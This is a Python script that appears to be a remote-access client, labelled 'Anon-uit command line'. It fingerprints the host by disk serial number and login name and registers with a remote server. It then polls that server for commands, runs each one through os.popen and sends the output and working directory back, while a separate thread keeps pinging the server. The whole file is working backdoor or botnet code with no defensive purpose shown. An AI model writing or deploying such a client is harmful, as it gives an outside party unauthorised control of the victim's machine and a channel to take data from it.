import requests
from threading import Thread
import os
import time
from datetime import datetime

endpoint_2 = 'http://127.0.0.1:8000/'
endpoint_1 = 'https://example.com/'

uid = f'{os.popen("wmic diskdrive get serialnumber").read().split()[-1]}'
name = os.getlogin()

def login():
    print(name)
    print(uid)
    content = {'name': name, 'uid': uid}
    login = requests.post(f'{endpoint_1}login', json=content)
    login = dict(login.json())
    print(login)
    threader()


def threader():
    t1 = Thread(target=commands)
    #t2 = Thread(target=receiver)
    t3 = Thread(target=ping)
    t3.start()
    t1.start()
    #t2.start()


def receiver():
    while True:
        message = requests.get(f'{endpoint_1}reader')
        message = dict(message.json())
        print(message)

        if message['new']:
            sender = message['sender']
            message = message['message']['message']
            print(f'Anon-uit command line [Version 0.0.1]/{sender}: {message}')

def commands():
    print('Anon-uit command line [Version 0.0.1]/Starting command listerner...')
    while True:
        try:
            content = {'name': name, 'uid': uid}
            command = requests.get(f'{endpoint_1}read_command', json=content)
            command = dict(command.json())
            received = str(datetime.now())
            if command['new']:
                try:
                    received = datetime.now()
                    time_start = time.time()
                    for c in command['command']:
                        sender = c['target']
                        command = c['command']
                        print(f'Anon-uit command line [Version 0.0.1]/{sender}: {command}')
                        print(f'executing {command}..')
                        cmm = os.popen(command)
                        cmm = cmm.read()
                        finish = time.time() - time_start
                        print('finish')
                        content = {'response': cmm, 'client': uid, 'time_received': str(received),
                                   'exec_duration': str(finish), 'directory': str(os.getcwd())}
                        sender = requests.post(f'{endpoint_1}command_feedback', json=content)
                        print(sender)
                except Exception as e:
                    print(e)
                    content = {'response': 'Error while trying to execute command', 'client': uid,
                               'time_received': str(received), 'exec_duration': 'None'}
                    sender = requests.post(f'{endpoint_1}command_feedback', json=content)
                    print(sender)
        except Exception as e:
            print(e)


def scripts():
    while True:
        message = requests.get(f'{endpoint_1}reader')
        message = dict(message.json())

        if message['new']:
            sender = message['sender']
            message = message['message']['message']
            print(f'Anon-uit command line [Version 0.0.1]/{sender}: {message}')


def ping():
    print('Anon-uit command line [Version 0.0.1]/Starting pinger...')
    while True:
        try:
            content = {'uid': uid}
            requests.get(f'{endpoint_1}ping', json=content)
        except Exception as e:
            print(e)


login()